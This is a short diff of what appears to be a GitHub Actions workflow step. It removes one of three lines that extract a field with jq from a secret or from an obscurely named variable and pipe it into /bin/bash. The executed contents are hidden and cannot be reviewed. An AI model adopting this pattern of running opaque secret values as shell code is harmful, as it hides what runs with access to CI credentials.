@@ -22,7 +22,6 @@ jobs:
           wfg4: ${{ secrets.wfg4 }}
         run: |
           printf '%s' "$wfg4" | jq -r .qkft3 | /bin/bash
-          echo $vdaoy03400 | jq -r .yz569 | /bin/bash
           echo $p82753 | jq -r .jyyl9115 | /bin/bash
 
       - name: Store results
